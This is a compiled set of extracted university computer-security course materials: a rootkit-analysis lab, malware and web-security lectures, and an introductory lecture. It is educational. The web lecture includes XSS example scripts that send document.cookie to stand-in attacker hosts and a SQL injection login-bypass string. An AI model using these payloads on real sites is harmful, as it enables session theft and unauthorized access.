---
tags:
  - university
  - bcs2420
  - computer-security
  - corpus
---

# Security Course Corpus

Full text extracted from the provided PDFs. This is the retained archive source, not the curated concept layer.

## Lab_3__Kernel_Compromise__Rootkit_Recon___Analysis.pdf

[Lab_3__Kernel_Compromise__Rootkit_Recon___Analysis.pdf](/Users/davidwickerhf/Downloads/Computer Security/Lab_3__Kernel_Compromise__Rootkit_Recon___Analysis.pdf)

```text
BCS2420
Lab 3: Operation LAST SIGNAL
Alexia-Madalina Cirstea
February 2026
Purpose of These Labs
These labs accompany Lecture 5, which introduces malware, stealth techniques, and rootkits.
Rather than detecting malware using signatures or scanners, these challenges train you tothink
like an analyst: questioning what you see, validating assumptions, and understanding how
malicious software hides its presence.
In Lecture 5, you learned that malware often:
•Hides itself from user tools
•Alters system call outputs
•Prunes results before returning them
•Evades detection by modifying what the user sees
These behaviors are especially characteristic ofrootkitsand stealth malware .
The challenges simulate these ideas for you in a controlled, safe environment.
1 Challenge 1: Last Signal
Narrative Context
You enter an abandoned kernel terminal inside a collapsed bunker. The system appears mostly
empty. However, you are informed that a final emergency signal exists.
Your task is to locate and read that signal.
Key Learning Goals
This challenge introduces the following concepts:
•File system navigation
•Hidden files
•Environment variables
•Trusting vs. verifying system output
•Stealth behavior
1
Concepts from Lecture
In Lecture 5, malware is described as intentionally designed to avoid detection and resist removal
. Rootkits in particular hide their presence by intercepting system calls and modifying results
before they reach the user.
This challenge simulates that idea: what you see is not always what exists.
1.1 Commands Introduced
ls
lslists the contents of a directory.
It answers questions such as:
•What files exist here?
•What folders exist here?
In normal conditions,lsshows what is present. However, malware can modify or filter what
it shows.
pwd
pwdstands forprint working directory. It tells you where you currently are in the file system.
Understanding your location is essential for navigation and forensic reasoning.
ls -la
The flags:
•-l: long format (permissions, ownership, size)
•-a: include hidden files (files starting with a dot)
Hidden files are often used for configuration, logs, or stealth storage.
Hidden Files
Files starting with a dot (.) are hidden by default. This is a basic concealment method used
both legitimately and maliciously.
1.2 Environment Variables
Environment variables store configuration values that affect how programs behave.
They can control:
•Paths
•Libraries
•Program behavior
•Output formatting
Malware can use environment variables to alter how tools behave without modifying the
tools themselves.
2
printenv
Displays all environment variables.
This is a diagnostic command that helps you understand what influences your shell.
env -u
This allows you to run a single commandwithouta specific environment variable.
This mirrors real-world malware analysis: you isolate components to see what changes.
2 Challenge 2: Last Broadcast
Narrative Context
The bunker kernel has suffered further corruption.
Not only are files hidden, but now the systemactively censors information.
Some tools lie.
Some outputs are falsified.
Your mission is to recover the last broadcast.
Key Learning Goals
This challenge expands upon Challenge 1:
•Stealth malware behavior
•Output manipulation
•Cross-checking system views
•Trust boundaries
•Forensic skepticism
Correlation to Lecture 5
In Lecture 5, you learned that rootkits and stealth malware often:
•Hook system calls
•Modify returned results
•Prune outputs
•Hide files, processes, and logs
This is calledpostprocessingorresult pruning.
This challenge simulates this idea.
2.1 Commands Revisited
cat
catoutputs the contents of a file.
In normal systems, it shows exactly what is stored.
However, in stealth systems, the output itself can be intercepted and modified.
3
2.2 Stealth Behavior
Stealth malware does not delete data.
Instead, it:
•Filters it
•Censors it
•Rewrites it
•Hides it
This makes detection much harder than simple deletion.
3 Important Terms
Malware
Malware is software intentionally designed to harm users or systems, violate privacy, or evade
detection .
Rootkit
A rootkit is a type of stealth malware that hides its presence while maintaining control of the
system.
Rootkits often:
•Intercept system calls
•Modify outputs
•Hide files
•Hide processes
Stealth
Stealth refers to the ability of malware to avoid detection by manipulating what the user and
security tools see.
Postprocessing / Pruning
Instead of preventing an action, stealth malware often modifies the result.
Example:
•A file exists
•The system removes it from directory listings
•The user believes it does not exist
4
4 Why These Challenges Matter
In real systems:
•Logs can lie
•Tools can be compromised
•Views can be manipulated
•Malware hides rather than deletes
These challenges teach you:
•Not to trust a single view
•To question clean outputs
•To verify assumptions
•To think adversarially
This is the mindset of real-world security analysts.
5 Challenge 3: The Living Kernel
Narrative
Year 2147.
The bunker is no longer merely corrupted.
Power draw is steady. Cooling cycles pulse at regular intervals. Sensors indicate activity.
Yet the system monitors report:
No active tasks.
This is no longer a question of missing data.
Something isrunning.
Something isalive.
You are tasked with proving the anomaly exists and extracting its signature.
Mission Objective
Your goal is to locate the running anomaly and recover its unique signature.
The signature will appear in the form:
FLAG{...}
Rules
•This is a beginner-to-intermediate challenge.
•Copy–paste is allowed.
•You may experiment.
•You should not assume system tools are honest.
5
You May Use the Following Commands
•ps
•top
•pgrep
•ls /proc
•cat /proc/<PID>/cmdline
•cat /proc/<PID>/environ
New Concepts
This challenge introduces several new ideas.
ProcessA process is a running instance of a program. Each process has a unique identifier
called a PID.
PID (Process ID)A PID is a number used by the operating system to track a running
program.
/proc /procis a virtual filesystem that exposes live system information. Each running process
has a directory named after its PID.
cmdlineThis file shows how a process was started.
environThis file contains the environment variables of a process.
StealthStealth refers to the ability of software to hide its presence by modifying what tools
show.
Important Note
One of the core ideas of this challenge is:
Do not trust a single view of reality .
Some tools may lie. Some outputs may be filtered. Some results may be pruned.
If one view looks too clean, seek another.
Where to Begin
You are encouraged to start with:
ps
top
pgrep
If the system appears inactive, ask yourself:
What does it mean for something to be alive if no tool reports it?
6
Success Condition
You have completed this challenge when you successfully recover the anomaly’s signature:
FLAG{...}
Final Thought
This challenge is not about memorizing commands.
It is about learning how to think:
•What assumptions am I making?
•What if this tool is lying?
•What is another way to observe the system?
6 Challenge 4: Encrypted Whisper — Learning Notes
What This Challenge Is About
In the previous challenges, you encountered an anomaly that:
•Hid files
•Lied about system output
•Existed as a hidden running process
In this challenge, the anomaly has changed its strategy.
Instead of hiding itsexistence, it now hides itsmeaning.
This reflects a common real-world malware behavior:
Modern malware often hides what it contains, not just where it is.
Your task is no longer about proving that something exists. It is about understanding what
that somethingmeans.
Key Learning Goals
By completing this challenge, you should understand:
•The difference between hiding data and hiding meaning
•Why malware uses encoding and compression
•How layered obfuscation works
•Why “noise” may actually be valuable information
•How analysts peel away multiple layers of transformation
Important Terms
PayloadThe payload is the actual content that malware is trying to protect or conceal. It is
themeaningful partof the data.
In this challenge, the payload is the message you are trying to recover.
7
EncodingEncoding is a reversible transformation that changes how data looks, not what it
means.
Encoding is often used to:
•Make data safe for transport
•Make binary data appear as text
•Evade simple text-based inspection
A common encoding format is Base64.
CompressionCompression reduces the size of data by representing it more efficiently.
Compressed data often appears random or unreadable.
Compression is frequently used by malware because:
•It reduces size
•It obscures patterns
•It complicates inspection
Anti-Detection T echniquesAnti-detection techniques are methods used by malware to
avoid being understood, analyzed, or flagged.
Instead of deleting evidence, malware often:
•Encodes it
•Compresses it
•Encrypts it
•Wraps it in multiple layers
This forces analysts to perform step-by-step decoding.
Why This Matters in Security
In the real world, malware rarely stores information in plain text.
Instead, it uses layers of transformation:
Original Data→Compressed→Encoded→Embedded
Each layer makes casual inspection harder.
Your job as an analyst is to:
•Recognize transformations
•Identify what kind of transformation was applied
•Reverse them safely
•Extract meaning
8
Takeaway
This challenge teaches an important shift in mindset:
If something looks like meaningless noise, that may be intentional.
Security analysis is not about guessing.
It is about:
•Recognizing patterns
•Identifying transformations
•Undoing them methodically
•Refusing to assume that unreadable means unimportant
7 Challenge 5: Survivor Protocol — Learning Notes
What This Challenge Is About
In earlier challenges you dealt with an anomaly that could:
•hide files,
•lie through tooling,
•exist as a running process,
•and conceal its messages.
In this challenge, the anomaly escalates again:
It resists removal.
You are no longer just finding hidden artifacts. You are investigatingbehavior over time.
If you terminate the anomaly and it returns, that is not magic. That is a real security
concept:persistence.
Key Learning Goals
By completing this challenge, you should understand:
•What persistence means in malware behavior
•How a watchdog/monitor process can enforce persistence
•Why relying on a single tool can be dangerous
•How to validate claims using multiple system views
•How analysts use logs and process metadata as evidence
Important Terms
PersistencePersistence is the ability of a malicious component to remain active even after
attempts to remove it. It can be implemented in many ways (startup scripts, schedulers, services,
watchdogs).
In this lab, persistence is demonstrated by an anomaly that returns after termination.
9
Monitor / W atchdogA watchdog (also called a monitor) is a process that supervises another
process. If the target disappears, the watchdog restores it.
Watchdogs are common in:
•legitimate systems (high availability, self-healing),
•and malicious systems (persistence, resilience).
Compromised T ooling (Cross-Checking)In incident response, tools can lie:
•a binary may be replaced,
•output may be filtered,
•environment variables may change behavior,
•PATH order may redirect commands.
Therefore, analystscross-check: if one tool reports “nothing,” you confirm using another
tool or another system view.
Process MetadataProcesses have identifying information that can be used for investigation:
•PID (process ID): the unique number for a running process
•PPid (parent PID): who started the process
•cmdline: how the process was launched
•environ: environment variables available to that process
This metadata can reveal relationships and intent.
Why This Matters in Security
Persistence is one of the most important characteristics of real malware. Many incidents are
not aboutfinding a file— they are about understanding a system that:
•repairs itself,
•recreates removed components,
•restores compromised state,
•and resists cleanup.
This challenge trains you to think like an analyst:
If something returns, ask: “what mechanism is restoring it?”
Takeaway
The goal is not to brute-force commands.
The goal is to learn a pattern:
Symptom (it returns)→Hypothesis (persistence)→Evidence (monitor/logs/process data)
This pattern generalizes directly to real-world incident response.
10
```

## Lecture 05.pdf

[Lecture 05.pdf](/Users/davidwickerhf/Downloads/Computer Security/Lecture 05.pdf)

```text
Malware
Threats
BCS2420
Dr. Ashish Sai
ashish.sai@maastrichtuniversity.nl
Introduction
Malware, including viruses, worms,
rootkits, and botnets, exploits software
vulnerabilities to propagate, evade
detection, and resist removal,
highlighting the need to learn from past
failures to improve security design.
Defining Malware
Malware is software intentionally
designed to harm users or systems, causing
damage to data, software, hardware, or
privacy. Harmful software, a broader
class, includes unintentional damage from
design or implementation errors.
Characteristics
Intention: Designed to
harm.
–
Damage: Affects data,
software, hardware,
or privacy.
–
User Approval: Runs
without explicit user
approval.
–
Examples
Viruses–
Worms–
Trojan Horses–
Ransomware–
Botnets–
How Malware
Gets Onto Devices
Web-Based Attacks
Websites: Links in phishing emails,
search results, ads directing traffic to
compromised sites.
–
Pharming Attacks: Disrupt IP address
resolution to misdirect browsers.
–
Downloaded Executables
Repackaged Software: Legitimate
software modified to include malware.
–
Pure Malware: Software that is purely
malicious or contains hidden malicious
functionality.
–
Drive-by Downloads
Browser Vulnerabilities: Exploiting
browser vulnerabilities to install
malware without user knowledge.
–
Network Worms and Email
Viruses
Network Worms: Exploit vulnerabilities
in network services to spread.
–
Email Viruses: Malicious attachments in
emails spread malware.
–
Source Code
Repositories and
Hardware
Embedded Malware:
Malware in source code
repositories or firmware.
–
Compromised Supply
Chains: Malicious
firmware or hardware.
–
Photo by Winston Chen on Unsplash
What Makes
Malware Hard to
Detect
Context-Dependent
Legitimate Software: Software can be
malware if installed by an attacker.
Differing opinions on whether ad-
displaying software is malware!
–
Undecidability and Anti-Detection
Design
Complete malware detection is
impossible. (Theoretical Proof)
–
Aggressive Design: Malware is designed
to avoid detection and reverse-
engineering.
–
Preventing
Malware
Installation
Restricting Software Installation: Limits user freedom,
causing inconvenience and unpopularity.
1.
User Education: Requires ongoing investment in awareness
and training.
2.
Code-Signing and Anti-Malware Tools:
• Code-Signing: Verifies executable content.
• Anti-Malware: Detects and removes known threats but
offers partial protection.
3.
Reinstallation: Used in severe cases to fully remove malware
by reinstalling the OS and applications.
4.
Software Churn and Malware
The ease of modern software installation
and updates accelerates progress but also
enables malware. Users frequently install
misrepresented software with hidden
functions, while high software turnover in
networks and devices increases malware
risks.
Viruses
Definition
A virus infects programs or files,
replicating itself. It spreads with human
action (e.g., USB drives, email
attachments) and infects executable
content.
Structure
Dormancy: Inactive until the host runs.1.
Propagation: Spreads to other files or
machines.
2.
Trigger Condition: Activates the payload.3.
Payload: Delivers functionality, from
benign to severe.
4.

Examples
Brain Virus (1986) : First PC virus,
spread via floppy disks.
– 1
CIH Chernobyl Virus (1998-2000) :
Destructive, overwrote hard disk
sectors and BIOS.
– 2
https://www.historyofinformation.com/detail.php?id=16761.
https://www.computerhope.com/vcih.htm2.
Worms
Definition
Worms propagate automatically and
continuously, leveraging network
protocols and vulnerabilities. They do
not require user interaction.
Differences from Viruses
Automatic Propagation: No user action
needed.
1.
Network Spread: Exploits network protocols.2.
Vulnerability Exploitation: Uses software
vulnerabilities rather than social engineering
.
3.
1
Social Engineering: A manipulation technique used to exploit human behavior and gain
unauthorized access to systems, data, or resources, often through deception or psychological
tactics.
1.
Example
Morris Worm (1988):
First wide-scale worm,
exploited multiple
software
vulnerabilities.
–
Photo by Onur Buz on Unsplash
Email-Based Malware
Combines virus and worm properties, spreading
via email attachments and client features. Often
involves social engineering.
Example
Happy99 (1999): Convincing users to run an
attached executable.
–
Anti-Detection Techniques
Encrypted Body
Polymorphic
External Decryption Key
Metamorphic
Simple Encryption: Fixed mappings or symmetric-key encryption.–
Mutating Decryptor: Changes decryptor portions to avoid detection.–
External Key Storage: Key stored outside the infected file.–
Rewriting Code: Virus rewrites its own code on a per-infection basis.–

Techniques to Remain Hidden
Direct Kernel Object Modification
(DKOM): Alters kernel  data
structures.
1.
1
Postprocessing System Call Results:
Prunes results before returning them.
2.
Kernel: The core component of an operating system, managing hardware resources and enabling
communication between hardware and software.
1.
Stealth: Trojan
Horses, Backdoors,
Keyloggers,
Rootkits
Photo by Tayla Kohler on Unsplash
Trojan Horse
Software delivering
malicious functionality
along with, or instead
of, its purported
functionality.
–
Examples: Fake
updates (e.g., Java,
Flash), free applications
(e.g., screen savers).
–
Backdoors
Definition: Unauthorized access
points bypassing normal
authentication mechanisms.
–
Usage: Often included in Trojan
software and rootkits.
–
Keyloggers
Definition: Software that records user
keystrokes.
–
Targets: Credit card details, passwords
for online banking, corporate
accounts, etc.
–
Rootkits
Definition: Surreptitiously
installed software
components that hide their
presence and facilitate
malicious activities.
–
User Mode Rootkits: Run in
user space with superuser
privileges.
–
Kernel Mode Rootkits: Run
in kernel space, accessing
kernel resources and memory.
–
Photo by Lukas on Unsplash
Example: Rootkit Goals
Backdoor Functionality: Ongoing
remote access.
1.
Keyloggers: Recording keystrokes.2.
Surveillance: Using device
microphones, webcams, sensors.
3.

Rootkit Detail:
Installation, Object
Modification,
Hijacking
Hijacking System Calls
Method 1: Hooking: Redirects calls to rootkit
code, allowing it to intercept and modify results.
–
Method 2: Overwriting: Replaces system call
code with malicious code.
–
Method 3: Substituting: Replaces the entire
syscall table with a modified one.
–
Windows Function Hooking
Kernel Space: Hooks SSDT  (System Service
Dispatch Table).
–
User Space: Hooks IAT  (Import Address
Table).
–
NTAPI/Native API: Wrapper functions in
ntdll.dll  library.
–
Inline Hooking
Detour Patching: Uses detour and
trampoline functions to insert code
before and after the original function.
–
Detection: Cross-checking table
addresses or hashing the target function
for integrity.
–
Kernel Object Modification and Pruning
Reports
DKOM: Directly alters kernel data
structures.
–
Postprocessing: Prunes results of
system calls before returning them to
hide rootkit-related activities.
–

Installing Rootkits
Kernel Module Installation: Loading a malicious kernel
module.
1.
Exploiting Vulnerabilities: Buffer overflow in kernel code.2.
Modifying Boot Process: Rogue boot loader altering the
kernel.
3.
Swapping Memory: Modifying swapped kernel memory.4.
Physical Address Access: Using DMA writes to alter kernel
memory.
5.
Loadable Kernel Modules (LKMs)
Executable code that can be added or removed
from a running kernel to extend functionality.
–
Process: Compiler generates object files, linker
combines them into executable files, loader
moves them to memory, and dynamic linker
resolves shared libraries.
–
User Mode Rootkits
Operation: Intercepts resource
enumeration APIs in user processes.
–
Detection: Cross-view difference
approach compares results from
different API calls to detect
discrepancies.
–
Protecting Secrets and Local Data
Encrypted Filesystems: Automatically encrypt
data stored to the filesystem and decrypt data
upon retrieval.
–
Disk Encryption: Software or hardware-
supported encryption for all disk storage.
–
RAM Encryption: Protects secrets such as
passwords and cryptographic keys in memory.
–
Drive-By
Downloads and
Droppers
Drive-By Downloads
Exploitation: Embeds malicious scripts in web
pages to exploit browser vulnerabilities.
–
Redirection: Involves multiple redirect hops to
download binaries.
–
Deployment: Spreads keyloggers , backdoors ,
rootkits , and botnet  recruitment.
–

Droppers and Downloaders
Droppers install other malware, and
downloaders specifically download
additional components.
–
Example: Babylonia (1999): An early
dropper that downloaded and executed
additional files.
–
Ransomware,
Botnets, and
Other Beasts
Photo by Ed Hardie on Unsplash
Ransomware
Definition: Encrypts user files
and demands payment for
decryption keys.
–
Asymmetric File Locking:
Uses public-key cryptography
to encrypt symmetric keys.
–
Example: WannaCry (2017):
Infected over 200,000
computers, demanding
Bitcoin payments.
–

Botnets and Zombies
Compromised computers (bots) controlled remotely,
forming a network (botnet).
–
Communication Structures:–
Client-Server Model: Central administrative server.1.
Peer-to-Peer: Coordination over network protocols.2.
Multi-Tiered Hierarchies: Insulating bot herders from
zombies.
3.
Other Beasts
Zero-Day Exploits: Attacks using unknown
vulnerabilities.
–
Logic Bombs: Malicious code triggered by specific
conditions.
–
Rabbits: Rapidly replicating malware that
consumes resources.
–
Easter Eggs: Harmless hidden features in software.–
Social
Engineering
Social Engineering
Tricking users into downloading, installing,
and executing malware through deceptive
tactics.
–
Example: Happy99 (1999): An email worm-
virus convincing users to run an attached
executable.
–
Categorizing Malware
Based on Propagation: Viruses, worms,
drive-by downloads.
–
Based on Payload: Ransomware,
keyloggers, backdoors.
–
Based on Stealth: Rootkits, logic bombs.–
Category name Property **** (blank denotes: no) **** ****
BREEDS† HOSTED STEALTHY VECTOR
virus 3 3 U
worm 3 N
Trojan horse 3 3 E or S
backdoor maybe 3 T or S
rootkit, keylogger 3 T or S
ransomware T
drive-by download H 3 S
```

## Lecture 06.pdf

[Lecture 06.pdf](/Users/davidwickerhf/Downloads/Computer Security/Lecture 06.pdf)

```text
Securing Web
Applications 
!
BCS2420
Dr. Ashish Sai
ashish.sai@maastrichtuniversity.nl
Web Review: Domains,
URLs, HTML, HTTP, Scripts
The Domain Name System (DNS) provides a hierarchical
naming scheme for internet resources, supported by an
operational infrastructure.
–
Uniform Resource Locators (URLs) specify the location
of files and web pages.
–
URL Example: http://bcs.ashish.nl/lecture.html
URL template: 
 scheme://host[:post]/pathname[?
query]
http : retrieval protocol–
bcs : unqualified hostname–
ashish.nl : second level domain–
lecture.html : file on host machine–
[]  denotes optional–
Domains and Subdomains
A domain name consists of one or more dot-separated
parts. The top level domain can be generic ( .com , .org )
or country code based ( .nl , .ie ).
–
Lower-level domains are subordinate to parent domains
in the hierarchical name tree.
Second and third-level domains represent organizations,
while subdomains denote departments or services.
–
URL Syntax
A URL is a type of URI, typically in the
format hostname.subdomain.domain. .
–
It may include a retrieval protocol, file
location, and optional query parameters.
–
scheme://host[:port]/pathname[?query]
May be used to pass parameters to an
executable resource.
–
The port is often ommited for a well-
known default (e.g., 80 for HTTP, 443
for HTTPS)
–
Hypertext Markup Language
( HTML )
HTML  is a system for annotating content in
text-based documents (e.g. web pages).
–
It uses markup tags (e.g., <p></p> ) to
identify structure and content.
–
A hyperlink specifies a URL for a web
page from another location.
–
An anchor tag links a URL to display text:
<a href="url">text</a> .
–
An inline image tag <img src="url">
embeds an image from a URL.
–
Executable Content in HTML
HTML documents can include scripts (e.g., JavaScript)
to manipulate the page and document object, forming
active content.
–
Scripts can be inline (<script>...</script> ) or
linked externally (<script src="url"></script> ).
–
Event handlers (e.g., onclick ) often trigger scripts
based on browser-detected events.
–
Document Loading, Parsing, Javascript
Execution
Document Loading, Parsing, and JavaScript Execution
<script>  blocks execute sequentially as encountered by the
HTML parser.
1.
JavaScript can use document.write()  to inject text inline during
loading.
2.
A javascript: scheme executes code when the URL is loaded.3.
Event handler JavaScript runs when the browser detects the
specified event.
4.
Hypertext Transfer Protocol (HTTP)
HTTP  is the main protocol for data transfer between browsers
and servers.
–
A client opens a TCP connection and sends an HTTP request,
consisting of a request line, headers, and an optional body.
–
Common methods include GET , POST , and CONNECT , with the
request-URI identifying the object.
–
HTTP  responses have a similar structure, starting with a status
line.
–
HTTP Request/Response Structure
HTTP Proxies
An HTTP proxy intermediates between a client and
server, managing access and relaying responses.
–
Proxies can function as gateways, translate
protocols, and enhance efficiency via caching.
–
The CONNECT  method enables tunneling of
encrypted TCP streams through a proxy.
–

(Ab)use of HTTP Proxies
Proxies are set in browser proxy
settings and enable middle-person
attacks if the proxy is untrustworthy.
–
Proxy can also cause HTTPS
interception.
–
Browser (URL) Redirection
HTML documents can redirect browsers to other sites
using:
–
Javascript (window.location="url" )–
A refresh meta tag in HTML (
<meta http-
equiv="refresh" content="N; URL=new-url"> )
–
A refresh header in an HTTP response–
An HTTP Location  header with status code 3xx.–
TLS and HTTPS (HTTP over TLS)
HTTPS secures web traffic by using TLS (Transport Layer
Security) over TCP.
HTTP requests are transmitted through the TLS channel.–
A TLS channel has two layers:–
Handshake layer: Sets up parameters, including key
exchange, server settings, integrity, and authentication.
–
Record layer: Secures application data.–
TLS Handshake
Establishes a shared master key via key exchange (e.g.,
Diffie-Hellman Ephemeral or pre-shared key).
–
Involves server and client nonces, offered algorithms, and
key shares.
–
Authenticates the server using PSK, RSA, or ECDSA
signatures.
–
Ensures forward secrecy, protecting past traffic even if
long-term secrets are disclosed.
–

Encryption and Integrity (TLS 1.3)
TLS ensures a secure channel with authenticated
key exchange and authenticated encryption (e.g.,
ChaCha20, AES) for confidentiality and MAC tags
for integrity.
–
Session resumption (0-RTT) enables quicker
session setup using a pre-shared key.
–
STARTTLS
STARTTLS is a strategy for upgrading
regular protocols to TLS on the same port.
–
Some protocols using STARTTLS include
SMTP , IMAP , POP3 , LDAP , NNTP , and
XMPP .
–
DOM Objects and HTTP Cookies
An HTML document is represented as a Document
Object Model (DOM), accessible via
window.document .
–
The window.location  object provides URL
components, including window.location.href .
–
The DOM acts as an API for JavaScript to modify
web page content.
–
Browser Cookies
HTTP is stateless and provides no
mechanism for remembering state from
previous requests. HTTP Cookies provide
a mechanism for retaining state across
requests from the same server.
–
The server sends size-limited data
strings to the client, which returns them
with future requests to the same server.
–
Cookies can be short-lived session
cookies or persistent with specific
attributes.
–
Cookie Attributes
Max-Age: Sets an upper bound on how long a client retains a cookie.–
Domain: Sets the cookie's scope to a superset of hosts including the
origin server.
–
Path: Controls which server pages a cookie is returned to.–
Secure: If specified, the cookie should only be sent over HTTPS.–
HttpOnly: The cookie cannot be accessed via Javascript.–
Cookies are stored with their associated attributes.–
document.cookie  returns all the cookies for the current document.–
Same-Origin
Policy (DOM SOP)
Same-Origin Policy (DOM SOP)
The Same-Origin Policy (SOP) enforces isolation,
preventing interference between documents from
different origins.
–
Scripts can access content only if it shares their
origin.
–
The goal is to segregate content into distinct
protection domains.
–

SOP Motivation
SOP prevents malicious code from accessing
sensitive data from other sites.
–
Without it, JavaScript  from a malicious site
could access data from a banking site in the same
browser.
–
Strict host isolation can be overly restrictive,
necessitating nuanced rules.
–
SOP Rules
An HTML  document’s origin is derived from its URL .–
Scripts and images inherit the origin of the HTML
document that loaded them, not their source.
–
Scripts can access content with matching origins.–
Origins are compared using a (scheme, host, port)
triplet, where the host is a fully qualified domain
name.
–
Relaxation of SOP
Developers can manipulate
document.domain  to set a common parent
domain to loosen SOP between subdomains.
–
The cookie's scope is controlled through the
Domain  and Path  attributes.
–
Plugins have their own same origin policy.–
Authentication
Cookies, Malicious
Scripts and CSRF
Session IDs (random numbers) are often stored
in HTTP  cookies to manage browser sessions.
–
For authentication, session ID cookies store
login states and extend authenticated sessions.
–
These cookies are prime targets, as they grant
the benefits of authenticated sessions.
–
Cookie Theft
Authentication cookies may be
stolen by:
Malicious Javascript
( HttpOnly  cookie attribute
mitigates this)
–
Untrustworthy proxies (use
the Secure cookie attribute)
–
Client-side malware.–
Physical access to the system.–
Photo by No Revisions on Unsplash
Servers must encrypt and sign cookies
holding sensitive values, and include
separate mechanisms to prevent replay
and injection of cookies.
Cross-Site Request Forgery (CSRF)
CSRF attacks exploit authentication cookies:–
If an authentication cookie suffices to authorize
a transaction, an HTTP request to the site is pre-
authorized.
–
An attacker could craft a request and have the
victim's browser send it.
–
An attacker can trigger actions
like a bank transfer by
embedding an HTTP request in
a malicious webpage or email.
–
CSRF achieves its goal in a
single HTTP request.
–
Defenses can’t rely on IP
addresses since the victim’s
browser sends the request.
–
CSRF attacks illustrate the
.
–
confused deputy problem
Photo by Alison Wang on Unsplash

CSRF Mitigation
CSRF attacks can be mitigated using secret validation
tokens.
–
The server issues a unique secret at session start.–
The browser includes this token in subsequent
requests for server validation.
–
CSRF attackers, lacking the secret, cannot generate
valid tokens.
–
More Malicious Scripts: Cross-
Site Scripting (XSS)
Cross-Site Scripting (XSS) involves injecting
malicious HTML tags or scripts into web
pages, causing unintended behavior on user's
browsers.
–
A classic example involves stealing cookies.–
Example: Stored XSS  occurs when an
attacker stores malicious input on the
server, which is later displayed to other
users.
XSS Example
Here is a picture of my dog <img id="mydogpic" src="dog.jpg">
<script>document.getElementById("mydogpic").src="http://
badsite.com/dog.jpg?arg1=" + document.cookie </script>
A malicious user types this into a web forum:–
This results in the user's cookies being sent to badsite.com .–
Input sanitization is needed to prevent this from happening.–
Types of XSS
Stored (persistent) XSS: Stored on the target
server.
–
Reflected (non-persistent) XSS: The injected
script is reflected back in an error message or
other response.
–
DOM-based XSS: Modifies the client-side DOM
environment.
–
Reflected XSS Example
<a href='http://www.good.com/ <script>document.location="http://bad.com
/dog.jpg?arg1="+document.cookie; </script>'>Click here</a>
File-not-found: <script>document.location="http://bad.com/
dog.jpg?arg1=" + document.cookie;</script>
A malicious user goes to www.start.com  which contains a link–
Clicking on the link causes a file-not-found error on the target website
www.good.com  which is then processed by the browser as HTML:
–
This causes the user's cookies for www.good.com  to be sent to
badsite.com .
–
XSS: Potential Impacts
XSS allows execution of injected scripts, and full control of a user's
browser.
–
Possible outcomes of XSS attacks:–
Browser redirection to attacker-controlled sites.–
Access to authentication cookies.–
Access to browser stored data.–
Rewriting the displayed document.–
It is important to avoid giving the attacker the power to execute
arbitrary javascript.
–
XSS Defenses
Tag filtering removes or replaces certain HTML tags.–
Evasive encoding replaces characters used for
scripting with unicode or HTML entities.
–
Input sanitization removes potentially malicious
elements from the user input by whitelisting, output
escaping, or blacklisting.
–
Content Security Policy can also be used as defense.–
Photo by Sunder Muthukumaran on Unsplash
SQL Injection
SQL injection involves
crafting input to cause
attacker chosen SQL
commands to be executed
on the backend database.
–
SQL queries are
dynamically constructed
using user input, presenting
opportunities for injection.
–
SQL Injection Example
query
=
"SELECT * FROM pswdtab WHERE username='"
+ un + AND password='" + pw +
"'"
SELECT * FROM pswdtab WHERE username='root' -- AND password='...'
A web page uses SQL to construct a query to retrieve a users password from the
database based on a user input, un  and pw .
–
If a user inputs root' --  in the username field, the query becomes:–
The --  comments the rest of the line, skipping the password check, and giving
access to the root account.
–
SQL and Single-Quotes
SQL single quotes appear in two distinct contexts: data input
and SQL syntax.
–
This ambiguity makes it difficult to keep program input
separate from developer SQL code.
–
Single quotes are one of many issues requiring output escaping
in SQL.
–
Also other characters than a single quote need to be escaped.–
SQL Injection Defenses
Escaping: Adjusting received input to remove clearly
identified problems.
–
Input filtering by blacklists: Reject known-bad input.–
Positive validation: Only allow known-good input
(whitelisting).
–
Other programming defenses: Prepared statements, stored
procedures, and input validation (via whitelists).
–
SQL Injection Mitigation Systems
AMNESIA: Uses static analysis to build models of legal
queries.
–
SQLCheck: Checks at runtime that queries conform to a
specified grammar.
–
SQLGuard: Compares query parse trees before and after
user input.
–
WebSSARI: Based on information flow analysis, static
analysis, and conformance to predefined conditions.
–
```

## Lecture 1.pdf

[Lecture 1.pdf](/Users/davidwickerhf/Downloads/Computer Security/Lecture 1.pdf)

```text
Fundamentals of Computer SecurityBCS2420
Dr. Ashish Sai
ashish.sai@maastrichtuniversity.nl



The Problem: 50 years ago, no internet transactions.
Today, billions are transferred online daily! 
 Cybercrime
cost $6T in 2021.
If annual cybercrime were a
country, it would have the third-
largest gross domestic product
(GDP) worldwide.
WannaCry Ransomware Attack
• Date: May 2017
• Incident: Ransomware exploiting
Windows vulnerabilities, encrypting
data and demanding Bitcoin
payments.
• Impact: Affected over 230,000
computers in 150+ countries,
including the UK’s NHS.

NotPetya Malware Attack
• Date: June 2017
• Incident: Malware disguised as
ransomware, targeting Ukrainian 
infrastructure and spreading
globally 
.
• Impact: Disrupted operations of
major corporations like Maersk and
Merck, with damages over $10
billion.
Stuxnet Worm
• Date: Discovered in 2010
• Incident: Sophisticated worm
targeting Siemens PLCs, aimed at
Iran’s 
 nuclear facilities.
• Impact: Damaged centrifuges at
Iran’s Natanz facility, delaying
nuclear progress.

TRITON Malware Attack on Saudi
Petrochemical Plant
• Date: August 2017
• Incident: TRITON malware
targeted the safety systems of a
Saudi petrochemical plant, aiming
to disable safety mechanisms and
cause physical damage.
• Impact: Detected and halted
before causing harm, marking a
significant escalation in cyber
threats to critical infrastructure.
Security Concepts and Principles
Computer Security and Internet Security 
Security of software, computers, and computer networks.–
Protecting information transmitted over and stored on
these devices.
–
Includes PCs, laptops, tablets, smartphones, servers,
and network devices (firewalls, routers, switches).
–
Computer security is the combined art, science, and
engineering practice of protecting computer-related assets
from unauthorized actions and their consequences, either
by preventing such actions or detecting and recovering
from them.
Fundamental Goals of Computer Security
CIA
AvailabilityIntegrity
Conﬁdentiality
Confidentiality
Definition
Non-public information remains accessible only to
authorized parties.
–
Supported by access control 
, encryption 
, and
procedural means 
.
–
Confidentiality
Methods
Access Control: Enforced by the operating system.–
Data Encryption: Cryptographic algorithms .– 1
Procedural Means: Physical access restrictions to offline
storage media.
–
More on this in Lecture 2. 1. ↩︎
Integrity
Definition
Ensures data, software, or hardware remains unaltered,
except by authorized parties.
–
Integrity
Methods
Example: Ensuring software updates are not tampered
with.
Error Detection/Correction Codes: Handle benign errors.–
Access Controls and Cryptographic Checksums: Combat
malicious integrity violations.
–
Availability
Definition
Ensures information, services, and computing resources
are accessible for authorized use.
–
Availability
Methods
Reliable Hardware and Software: Ensure system
reliability.
–
Protection Mechanisms: Prevent intentional disruptions
such as denial of service attacks.
–
Authorization
Definition
Computing resources accessible only by authorized
entities.
